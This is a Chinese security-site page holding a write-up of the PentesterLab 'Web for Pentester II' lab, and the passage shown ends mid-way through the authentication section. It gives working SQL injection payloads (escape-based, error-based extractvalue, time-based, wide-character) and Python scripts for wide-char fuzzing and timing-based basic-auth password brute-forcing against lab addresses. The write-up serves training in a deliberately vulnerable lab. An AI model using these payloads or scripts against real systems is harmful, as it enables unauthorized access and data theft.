<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】Web for Pentester II练习题解 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Pentester,渗透测试,PentesterLab教程,web渗透"/>
    
        <meta name="description" content="PentesterLab是一个学习渗透测试的平台。提供了很多存在漏洞的镜像，可用于测试和学习漏洞。Web for Pentester II是PentesterLab上集成了常见Web漏洞的镜像，本篇文章为该练习的题解。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】Web for Pentester II练习题解</h2>
                <div class="article-msg">
                    <span class="time">2017-01-04 11:23:12</span>
                    
                                        <span class="read">阅读：24083次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3369"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3369" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2812295712" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2812295712" style="color:#848e99;">shinpachi8</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><img src="http://p9.qhimg.com/t01931a1b6727aba244.png" title="t016ec323718e69c93e.png" alt="http://p2.qhimg.com/t016ec323718e69c93e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="white-space: normal; text-indent: 0em; text-align: center;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">Web for Pentester II ISO下载地址：</span></strong></span><a href="https://pentesterlab.com/exercises/web_for_pentester_II/iso" target="_self" textvalue="https://pentesterlab.com/exercises/web_for_pentester_II/iso" style="text-decoration: none;"><span style="color: rgb(255, 0, 0);"><strong><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">https://pentesterlab.com/exercises/web_for_pentester_II/iso</span></strong><strong><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">作者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2812295712" target="_blank" textvalue="shinpachi8" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">shinpachi8</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">预估稿费：300RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><strong>投稿方式：发送邮件至</strong><a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong>linwei#360.cn</strong></span></a><strong>，或登陆</strong><a href="http://bobao.360.cn/contribute/index" target="_blank" style="color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><strong>在线投稿</strong></strong></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最近</span><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一直在找mongodb的注入练习，结果在penetsterlab上<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 32px;">找到了</span>。发现了其中的web for pentester 2, 其实我并没有做过第一版。有兴趣同学可以试着做做这一套练习包括：SQL注入，认证，授权，验证码, 覆盖属性，随机数问题，mongodb注入几部分。其中除随机数没有做出来，其他的都有解法。在</span><a href="https://pentesterlab.com/" target="_blank" textvalue="pentesterlab" style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;"><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">pentesterlab</span></a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上下载iso镜像直接用在虚拟机打开就可以了。我用的是virtualbox。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">SQL注入</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">SQL注入就不多介绍了，搞安全的应该都知道。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.最简单的一个，没有什么过滤，只要万能密码就可以绕过。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.报错注入，&nbsp;</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t010f559a61a59d50c8.png" title="t016c6d090f0cb6781f.png" alt="http://p8.qhimg.com/t016c6d090f0cb6781f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由上图可以看出，可能是根据返回的结果来进行判断，即如果返回就算通过。 那么用union来使返回结果为正，就可以绕过。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t014d13bdc26b09a8d2.png" title="t019a1324dd47b5112d.png" alt="http://p7.qhimg.com/t019a1324dd47b5112d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3. 把单引号过滤了。只能想办法闭合单引号。试了试并没有过滤“\”，由前边的经验我们可以知道，后台的sql语句可能还是 </span></p><pre class="brush:plain;toolbar:false">select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=’param1’&nbsp;and&nbsp;password=’param2’</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"> 那么可以这样来绕过。</span><br/></p><pre class="brush:plain;toolbar:false">select&nbsp;*&nbsp;from&nbsp;users&nbsp;where&nbsp;username=&#39;\&#39;&nbsp;and&nbsp;password=&#39;&nbsp;or&nbsp;1=1#&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这时username的单引号被转义，所以被绕过了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4. 观察参数的形式，猜测可能是将参数直接代入where字段进行了查询，形式为： &nbsp;select * from users where [req content] &nbsp; &nbsp;这可以直接注入。放一个xml格式错误的报错 payload:</span></p><pre class="brush:plain;toolbar:false">username=&#39;hacker&#39;&nbsp;and&nbsp;extractvalue(1,&nbsp;concat(0x5e7e5e,(select&nbsp;concat(table_name)&nbsp;from&nbsp;information_schema.tables&nbsp;where&nbsp;table_schema=database()&nbsp;limit&nbsp;0,1)))#</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">更改 limit 与 concat()的内容可以将所有信息都查出来</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t011db3a743785da630.png" title="t01bb1450d7eaa52c5c.png" alt="http://p7.qhimg.com/t01bb1450d7eaa52c5c.png"/></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01977770621a62eed4.png" title="t011c7cb3dac9106a57.png" alt="http://p6.qhimg.com/t011c7cb3dac9106a57.png"/></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01758f32051da6155d.png" title="t01bc455f4568bc2fa0.png" alt="http://p6.qhimg.com/t01bc455f4568bc2fa0.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5. 由url形式可以推断出是在limit点的注入。这好像只可以用union来注入吧？如果有其他的方法的话请通知我… &nbsp;在union的时候可能会对不同的数据库版本有不同的影响。总之先看这一个</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01ccf9c9f3146f366f.png" title="t012881432a1f248060.png" alt="http://p2.qhimg.com/t012881432a1f248060.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">出来了1,2 字段，其它的就和上边一样了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">说一下问题，我在 5.5.50版本的mariadb上是可以使用这个语法的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是在10.1.13的版本上不行.. 可能是和版本有关系。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">MariaDB&nbsp;[security]&gt;&nbsp;select&nbsp;*&nbsp;from&nbsp;users&nbsp;limit&nbsp;1&nbsp;union&nbsp;select&nbsp;1,2,3;
ERROR&nbsp;1221&nbsp;(HY000):&nbsp;Incorrect&nbsp;usage&nbsp;of&nbsp;UNION&nbsp;and&nbsp;LIMIT
MariaDB&nbsp;[security]&gt;&nbsp;select&nbsp;version();
+-----------------+
|&nbsp;version()&nbsp;|
+-----------------+
|&nbsp;10.1.13-MariaDB&nbsp;|
+-----------------+
1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.36&nbsp;sec)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">6. 和第5差不多，只是将limit字段改成了group字段。注入手段是一样的。都可以用union来注入。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7. 这个题出的很有意思，它将id对应username相同的值都返回了。可以基于时间来注入。由 and if(length(database())=21,sleep(3),0) &nbsp;由返回的结果时间长短来判断正确与否</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01922fabd094be6daa.png" title="t013c9fc370d65959d2.png" alt="http://p5.qhimg.com/t013c9fc370d65959d2.png"/></p><p style="text-align:center"><img src="http://p2.qhimg.com/t015c7a7368f91c1a94.png" title="t019347532634e66be6.png" alt="http://p7.qhimg.com/t019347532634e66be6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">8. 是一个二次注入，如果我们使用用户名 如下：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0170901de38005156d.png" title="t01939365d92b1a9dc2.png" alt="http://p7.qhimg.com/t01939365d92b1a9dc2.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么可以得到如下结果</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0192ae359c3762eac4.png" title="t01b5a62fdbe35447ef.png" alt="http://p1.qhimg.com/t01b5a62fdbe35447ef.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样就可以得到想要信息了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">9. 宽字符注入。剩下的就简单了。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01794085d8c1b0c827.png" title="t01554de7596aeb64c4.png" alt="http://p5.qhimg.com/t01554de7596aeb64c4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">写了一个脚本来判断哪些是可以进行宽字符注入时可用的字符</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;sql9():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://10.108.40.237/sqlinjection/example9/?username=a%{}%27%20or%201=1%23&amp;password=a&amp;submit=Submit&quot;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;x&nbsp;in&nbsp;xrange(255):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;=&nbsp;hex(x)[2:]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(char)&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;=&nbsp;&quot;0&quot;&nbsp;+&nbsp;char
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;requests.get(url.format(char))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Success&quot;&nbsp;in&nbsp;html.text:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;0x{}&nbsp;works&quot;.format(char)
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Done&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">认证</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于认证来说，好多开发人员并没有正确了认证的本质，偶尔也会犯一些问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.	http basic认证</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">虽然是个认证，但是是弱口令的问题..</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.	http basic认证</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个之前我是用的字典暴破,, 效率相当慢不说还不一定能找到,后来看到了官方的答解，说是用字符串的对比来实现的认证，即如果密码是password， 那么输入passwodd 的响应时间一定比passdddd时间长。因为字符串对比需要的时间长。这样的话就可以用脚本来暴破了。如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">def&nbsp;auth2():
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;&quot;http://192.168.60.114/authentication/example2/&quot;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;passwords&nbsp;=&nbsp;[&quot;a&quot;,&nbsp;&quot;b&quot;,&nbsp;&quot;ac&quot;]
&nbsp;&nbsp;&nbsp;&nbsp;base_time&nbsp;=&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;passwords&nbsp;=&nbsp;string.lowercase&nbsp;+&nbsp;string.uppercase&nbsp;+&nbsp;string.digits
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;IPLIST={}
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_start&nbsp;=&nbsp;time.time()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;requests.get(url,&nbsp;auth=HTTPBasicAuth(&quot;hacker&quot;,&nbsp;password&nbsp;+&nbsp;&quot;a&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base_time&nbsp;=&nbsp;time.time()-tmp_start
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;pwd&nbsp;in&nbsp;passwords:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;=&nbsp;time.time()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html&nbsp;=&nbsp;requests.get(url,&nbsp;auth=HTTPBasicAuth(&quot;hacker&quot;,&nbsp;password&nbsp;+&nbsp;pwd))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;used_time&nbsp;=&nbsp;time.time()&nbsp;-&nbsp;start
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;html.status_code&nbsp;==&nbsp;200:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[*]&nbsp;FIND&nbsp;PASSWORD:&nbsp;{}&quot;.format(password&nbsp;+&nbsp;pwd)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;used_time&nbsp;-&nbsp;base_time&nbsp;&gt;&nbsp;0.1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;+=&nbsp;pwd
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;password:&nbsp;{}&nbsp;..&quot;.format(password)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;base_time&nbsp;-&nbsp;used_time&nbsp;&gt;&nbsp;0.1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;+=&nbsp;&quot;a&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[+]&nbsp;password:&nbsp;{}&nbsp;..&quot;.format(password)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
